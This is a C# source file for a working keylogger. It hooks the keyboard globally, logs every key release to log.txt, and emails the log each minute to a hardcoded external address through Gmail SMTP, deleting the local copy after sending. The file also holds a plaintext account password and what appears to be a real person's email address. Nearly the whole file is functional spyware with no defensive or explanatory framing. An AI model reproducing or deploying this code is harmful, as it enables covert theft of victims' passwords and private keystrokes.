﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using MouseKeyboardActivityMonitor;
using MouseKeyboardActivityMonitor.WinApi;
using System.Windows.Forms;
using System.Threading;

namespace KeyLogger
{
    class Program
    {
        private static Program logger;
        private System.Timers.Timer timer;
        private KeyboardHookListener m_KeyboardHookManager;
       // private MouseHookListener m_MouseHookManager;
       
        [STAThread]
        static void Main(string[] args)
        {
            

            logger = new Program();

            

            logger.init();
            Console.Read();
        }

        [STAThread]
        public void init()
        {
            //initHooks();
            //initTimer();

            Thread ht = new Thread(new ThreadStart(initHooks));
            ht.IsBackground = true;
            ht.SetApartmentState(System.Threading.ApartmentState.STA);
            ht.Start();

            Thread tt = new Thread(new ThreadStart(initTimer));
            tt.IsBackground = true;
            tt.SetApartmentState(System.Threading.ApartmentState.STA);
            tt.Start();

            //while (true)
            //  System.IO.File.AppendAllText("log.txt", Console.ReadKey().KeyChar.ToString());
        }

        [STAThread]
        private void initTimer()
        {
            this.timer = new System.Timers.Timer(1000 * 60 * 1);
            timer.Elapsed += new ElapsedEventHandler(email);
            timer.Start();

        }

        [STAThread]
        private void initHooks()
        {
            try
            {
                // m_MouseHookManager = new MouseHookListener(new GlobalHooker());
                //m_MouseHookManager.Enabled = true;

                m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker())
                {
                    Enabled = true
                };
                m_KeyboardHookManager.KeyUp += logger.HookManager_KeyUp;
                
            }
            catch (Exception e) { Console.WriteLine("Error initializing hook manager"); };
        }

        private void write(String str)
        {
            System.IO.File.AppendAllText("log.txt", str + "\n");
            Console.WriteLine("Written to file");
        }

        private void HookManager_KeyDown(object sender, KeyEventArgs e)
        {
            write(e.KeyData.ToString() + " Pressed");
        }

        private void HookManager_KeyUp(object sender, KeyEventArgs e)
        {
            Console.WriteLine("Wrote a KeyUp");
            write(e.KeyData.ToString() + " Released");
        }

        private void HookManager_MouseUp(object sender, MouseEventArgs e)
        {
            write(e.Button.ToString() + " Released");
        }


        private void HookManager_MouseDown(object sender, MouseEventArgs e)
        {
            write(e.Button.ToString() + " Pressed");
        }


        public void email(object source, ElapsedEventArgs e)
        {
            MailMessage mail = new MailMessage("passboltbsu@gmail.com", "19khai.hirschi@boiseschools.net");

            SmtpClient client = new SmtpClient();

            client.EnableSsl = true;

            client.Port = 587;

            client.DeliveryMethod = SmtpDeliveryMethod.Network;

            client.UseDefaultCredentials = false;

            client.Host = "smtp.gmail.com";

            client.Credentials = new System.Net.NetworkCredential("passboltbsu@gmail.com", "br3akMe!");

            mail.Subject = "Keylog";

            mail.Body = "Keylog attached";

            String attachmentFilename = "log.txt";

            if (attachmentFilename != null)

            {

                using (MemoryStream memoryStream = new MemoryStream())

                {

                    byte[] contentAsBytes = Encoding.UTF8.GetBytes(File.ReadAllText("log.txt"));

                    memoryStream.Write(contentAsBytes, 0, contentAsBytes.Length);



                    memoryStream.Seek(0, SeekOrigin.Begin);

                    ContentType contentType = new ContentType();

                    contentType.MediaType = MediaTypeNames.Text.Plain;

                    contentType.Name = "Keylog";



                    Attachment attach = new Attachment(memoryStream, contentType);

                    mail.Attachments.Add(attach);

                    client.Send(mail);

                }

            }

            if (File.Exists("log.txt")) { File.Delete("log.txt"); }
        }
    }
}
